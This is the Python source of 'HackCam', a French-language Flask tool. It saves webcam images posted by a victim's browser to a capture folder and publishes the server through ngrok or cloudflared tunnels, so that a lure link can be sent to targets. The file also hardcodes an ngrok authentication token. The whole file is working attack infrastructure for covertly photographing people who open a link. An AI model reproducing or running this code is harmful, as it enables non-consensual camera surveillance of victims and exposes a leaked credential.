from flask import Flask, render_template, request
import os
import base64
import subprocess
import time
import re
import platform
import urllib.request
import json

app = Flask(__name__)

NGROK_TOKEN = "30ygUgcUCzRLc2KwW9aLpRyqq0s_3ipxEH2H1Vhz4RfgjtqSv"

def digital_banner():
    try:
        os.system('clear')
    except:
        pass
    print("\033[1;31m")
    print("═══════════════════════════════════════════════")
    print("█▀▀ █▄█ █▀▄ █▀▀ █▀▀ █▀▀ ▄▀█ █░░ █░░ █▄▀ ▄▀█")
    print("█▄▄ ░█░ █▄▀ ██▄ █▄█ █▄█ █▀█ █▄▄ █▄▄ █░█ █▀█")
    print("═══════════════════════════════════════════════")
    print("⚡ Digital crew 243 | HackCam")
    print("🗂️ Dossier de capture : /sdcard/digitalcrew243_HackCam")
    print("[1] Cloudflared")
    print("[2] Ngrok\n")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json()
    image_data = data['image'].split(',')[1]
    number = data['number']
    path = '/sdcard/digitalcrew243_HackCam'
    os.makedirs(path, exist_ok=True)
    with open(f'{path}/capture_{number}.jpg', 'wb') as f:
        f.write(base64.b64decode(image_data))
    return 'OK'

def download_ngrok():
    arch = platform.machine()
    if arch.startswith('arm') or arch.startswith('aarch'):
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
    elif arch == 'x86_64':
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
    else:
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
    if os.path.exists('ngrok'):
        os.remove('ngrok')
    print("Téléchargement de Ngrok...")
    os.system(f'curl -s {url} -o ngrok.zip')
    os.system('unzip -qq ngrok.zip')
    os.system('chmod +x ngrok')
    os.remove('ngrok.zip')

def start_ngrok(port):
    download_ngrok()
    print("Ajout du token Ngrok...")
    os.system(f'./ngrok authtoken {NGROK_TOKEN}')
    print("Lancement de Ngrok...")
    ngrok_process = subprocess.Popen(['./ngrok', 'http', str(port)], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    start_time = time.time()
    public_url = None
    while time.time() - start_time < 20:
        try:
            with urllib.request.urlopen('http://127.0.0.1:4040/api/tunnels') as resp:
                data = json.load(resp)
                tunnels = data.get('tunnels', [])
                for t in tunnels:
                    pu = t.get('public_url', '')
                    if pu.startswith('https://'):
                        public_url = pu
                        break
                if public_url:
                    print(f"\033[1;32m🔗 Lien public (Ngrok) : {public_url}\033[0m\n")
                    return
        except:
            time.sleep(0.5)
    print("\033[1;31m⏰ Timeout : ngrok n’a pas répondu à temps.\033[0m")
    try:
        ngrok_process.kill()
    except:
        pass

def start_cloudflared(port):
    try:
        process = subprocess.Popen(
            ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT
        )
        start_time = time.time()
        while True:
            line = process.stdout.readline().decode(errors='ignore')
            if "trycloudflare.com" in line or "trycloudflare" in line:
                url_match = re.search(r'(https://.*\.trycloudflare\.com)', line)
                if url_match:
                    print(f"\033[1;32m🔗 Lien public (Cloudflared) : {url_match.group(1)}\033[0m\n")
                    break
            if line == '' and process.poll() is not None:
                break
            if time.time() - start_time > 20:
                print("\033[1;31m⏰ Timeout : cloudflared n’a pas répondu à temps.\033[0m")
                try:
                    process.kill()
                except:
                    pass
                break
    except Exception as e:
        print("\033[1;31mErreur cloudflared\033[0m")

if __name__ == '__main__':
    digital_banner()
    choix = input("🌐 Choisis ton tunnel (1/2) : ")
    port = 5000
    time.sleep(1)
    if choix == "1":
        start_cloudflared(port)
    elif choix == "2":
        start_ngrok(port)
    else:
        print("Choix invalide, utilisation Cloudflared par défaut.")
        start_cloudflared(port)
    app.run(host='0.0.0.0', port=port)